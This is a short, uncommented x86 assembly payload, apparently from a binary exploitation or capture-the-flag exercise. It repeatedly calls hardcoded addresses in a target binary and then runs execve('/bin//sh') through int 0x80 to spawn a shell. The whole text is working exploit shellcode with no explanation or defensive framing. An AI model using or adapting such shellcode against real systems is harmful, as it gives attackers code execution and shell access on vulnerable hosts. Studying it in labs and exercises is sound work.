xor ecx,ecx
xor eax,eax
mov  al, 1
mov cl, 8

push ecx
push eax
mov ebx,0x56556286
call ebx

xor ecx,ecx
push ecx
push eax
call ebx

mov cl, 5
push ecx
push eax
call ebx

xor ecx,ecx
push ecx
push eax
call ebx

xor ecx,ecx
push ecx
push eax
call ebx

mov cl, 4
push ecx
push eax
call ebx

mov    ebx,0x565562d1
call   ebx

xor    eax,eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
push   eax
push   ebx
mov    ecx,esp
xor    edx,edx
xor    eax,eax
mov    al,0xb
int    0x80
